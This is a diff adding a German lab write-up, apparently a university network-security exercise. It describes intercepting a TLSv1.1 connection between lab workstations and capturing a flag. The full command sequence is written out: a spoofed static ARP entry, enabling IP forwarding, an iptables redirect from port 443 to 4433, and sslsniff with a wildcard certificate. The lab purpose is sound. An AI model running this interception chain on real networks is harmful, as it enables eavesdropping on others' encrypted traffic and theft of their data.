@@ -15,6 +15,35 @@
  
 \section*{Aufgabe 1}
 
+\subsection*{a)}
+Ein Mitschnitt mittels Wireshark auf den Workstations zeigte, dass sich auf den Workstations mit den IPs \texttt{192.26.175.11} und \texttt{192.26.175.13} ein Prozess mittels TLSv1.1 mit der IP \texttt{192.26.175.15} verbindet. Um diese Verbindung mitzuschneiden änderten wir auf der Workstation mittels 
+\begin{verbatim}
+arp -s 192.26.175.15 52:54:00:2c:4f:ec
+\end{verbatim}
+Den ARP Eintrag für die IP \texttt{192.26.175.15} auf die MAC Adresse der Kali VM auf derselben Workstation.
+In der Kali VM starten wir das Tool sslsniff.
+Um dieses Tool verwenden zu können, mussten wir in der Kali VM mittels
+\begin{verbatim}
+echo 1 > /proc/sys/net/ipv4/ip_forward
+\end{verbatim} 
+Das IP forwarding einschalten. Außerdem haben wir wie in der \texttt{man-page} von \texttt{sslsniff} beschrieben die Regel für IP Tables umgeschrieben, sodass alle Zugriffe auf den Port 443 auf den Port 4433 umgeleitet werden.
+\begin{verbatim}
+iptables -t nat -A PREROUTING -p tcp --destination-port 443  -j REDIRECT --to-ports 4433
+\end{verbatim}
+Danach starteten wir sslsniff mit den folgenden Parametern:
+\begin{verbatim}
+sslsniff  -a  -c  /usr/share/sslsniff/certs/wildcard  -s 4433 -w /tmp/sslsniff.log
+\end{verbatim}
+Nach kurzer Zeit fanden wir die folgenden Zeilen in der Logdatei \texttt{sslsniff.log}:
+\begin{verbatim}
+Hallo bernd!
+Hier ist deine Flagge: 1107174691af9ff3681d2b5bdb5740b1589bae53
+\end{verbatim}
+Die Flagge lautet also \texttt{1107174691af9ff3681d2b5bdb5740b1589bae53}
+
+
+\subsection*{b)}
+
 \section*{Aufgabe 2}
 Da das EAP Protokoll nicht verschlüsselt ist, kann man aus den vier mitgeschnittenen
 
